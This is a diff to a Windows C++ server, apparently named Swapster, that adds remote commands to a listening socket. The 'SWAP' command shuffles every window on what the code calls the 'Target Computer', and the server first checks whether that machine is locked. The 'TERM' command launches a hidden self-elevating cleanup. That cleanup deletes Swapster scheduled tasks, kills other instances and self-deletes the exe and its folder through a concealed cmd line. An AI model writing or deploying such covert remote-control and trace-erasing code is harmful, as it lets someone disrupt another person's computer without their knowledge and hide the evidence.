@@ -4,9 +4,105 @@
 
 #include <iostream>
 #include <vector>
+#include <shellapi.h>
 #include "encryption.h"
+#include "swapster.h"
 
 #pragma comment(lib, "ws2_32.lib")
+
+static bool IsWorkstationLocked_ByDesktopName() {
+    // Open the currently active desktop (the one receiving user input)
+    HDESK hDesk = OpenInputDesktop(0, FALSE, GENERIC_READ);
+    if (!hDesk) {
+        // If we can't open the input desktop, treat as locked/restricted
+        return true;
+    }
+
+    char name[256] = {};
+    DWORD needed = 0;
+    bool locked = true;
+
+    if (GetUserObjectInformationA(hDesk, UOI_NAME, name, sizeof(name), &needed)) {
+        // When unlocked, this is typically "Default"
+        // When locked, it's typically "Winlogon"
+        locked = (_stricmp(name, "Default") != 0);
+    }
+
+    CloseDesktop(hDesk);
+    return locked;
+}
+
+#include <windows.h>
+#include <shellapi.h>
+#include <string>
+
+static bool is_admin() {
+  BOOL isAdmin = FALSE;
+  PSID adminGroup = NULL;
+  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+
+  if (AllocateAndInitializeSid(&NtAuthority, 2,
+      SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+      0,0,0,0,0,0, &adminGroup)) {
+    CheckTokenMembership(NULL, adminGroup, &isAdmin);
+    FreeSid(adminGroup);
+  }
+  return isAdmin != FALSE;
+}
+
+static int run_cleanup() {
+  // Elevate if needed
+  if (!is_admin()) {
+    char exe[MAX_PATH];
+    GetModuleFileNameA(NULL, exe, MAX_PATH);
+    ShellExecuteA(NULL, "runas", exe, "--cleanup", NULL, SW_HIDE);
+    return 0;
+  }
+
+  const char* TASK1 = "\\Swapster";
+  const char* TASK2 = "\\Swapster_Unlock";
+
+  // Delete tasks (do this before killing processes)
+  system("schtasks /delete /tn \"\\Swapster\" /f >nul 2>&1");
+  system("schtasks /delete /tn \"\\Swapster_Unlock\" /f >nul 2>&1");
+
+  // Kill other instances (NOT this one)
+  DWORD selfPid = GetCurrentProcessId();
+  {
+    std::string kill = "taskkill /IM swapster.exe /F /FI \"PID ne ";
+    kill += std::to_string(selfPid);
+    kill += "\" >nul 2>&1";
+    system(kill.c_str());
+  }
+
+  // Path to this exe
+  char exePath[MAX_PATH];
+  GetModuleFileNameA(NULL, exePath, MAX_PATH);
+
+  // After we exit: delete exe, then remove folder
+  std::string cmd =
+    "cmd /C ping 127.0.0.1 -n 3 >nul & "
+    "del /F /Q \"";
+  cmd += exePath;
+  cmd += "\" >nul 2>&1 & "
+         "rmdir /S /Q \"C:\\ProgramData\\Swapster\" >nul 2>&1";
+
+  STARTUPINFOA si{};
+  PROCESS_INFORMATION pi{};
+  si.cb = sizeof(si);
+
+  CreateProcessA(
+    NULL, (LPSTR)cmd.c_str(),
+    NULL, NULL, FALSE,
+    CREATE_NO_WINDOW | DETACHED_PROCESS,
+    NULL, NULL, &si, &pi
+  );
+
+  if (pi.hProcess) CloseHandle(pi.hProcess);
+  if (pi.hThread)  CloseHandle(pi.hThread);
+
+  return 0;
+}
 
 static SOCKET make_listen_socket(int port) {
   SOCKET ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -23,6 +119,12 @@ static SOCKET make_listen_socket(int port) {
 }
 
 int main(int argc, char** argv) {
+
+  // ---- Cleanup mode ----
+  if (argc == 2 && std::string(argv[1]) == "--cleanup") {
+    return run_cleanup();
+  }
+
   if (argc != 2) {
     std::cerr << "Usage: server.exe <port>\n";
     return 1;
@@ -59,8 +161,56 @@ int main(int argc, char** argv) {
 
     while (true) {
       std::vector<uint8_t> pt;
-      if (!ch.recv_msg(c, pt)) break;      // client disconnected or auth failed
-      if (!ch.send_msg(c, pt)) break;      // echo back
+      if (!ch.recv_msg(c, pt)) break; // client disconnected or auth failed
+
+      // Interpret plaintext as a string (safe even if it contains '\0' because we use size)
+      std::string msg(reinterpret_cast<const char*>(pt.data()), pt.size());
+      if(IsWorkstationLocked_ByDesktopName())
+      {
+        const char* reply = "Target Computer is locked.";
+        std::vector<uint8_t> out(reply, reply + strlen(reply));
+        if (!ch.send_msg(c, out)) break;
+        continue;
+      }
+      if (msg == "SWAP") { // trigger the window swap
+        swapster::SwapAllWindows();
+        const char* reply = "Swapping windows...";
+        std::vector<uint8_t> out(reply, reply + strlen(reply));
+        if (!ch.send_msg(c, out)) break;
+      }
+      else if (msg == "TERM")
+      {
+        char path[MAX_PATH];
+        GetModuleFileNameA(NULL, path, MAX_PATH);
+
+        std::string cmd = "\"";
+        cmd += path;
+        cmd += "\" --cleanup";
+
+        STARTUPINFOA si{};
+        PROCESS_INFORMATION pi{};
+        si.cb = sizeof(si);
+
+        CreateProcessA(
+            NULL,
+            (LPSTR)cmd.c_str(),
+            NULL, NULL,
+            FALSE,
+            CREATE_NO_WINDOW | DETACHED_PROCESS,
+            NULL, NULL,
+            &si, &pi
+        );
+
+        if (pi.hProcess) CloseHandle(pi.hProcess);
+        if (pi.hThread)  CloseHandle(pi.hThread);
+
+        return 0; // exit service process
+      }
+      else {
+        const char* reply = "Unknown command";
+        std::vector<uint8_t> out(reply, reply + strlen(reply));
+        if (!ch.send_msg(c, out)) break;
+      }
     }
 
     closesocket(c);
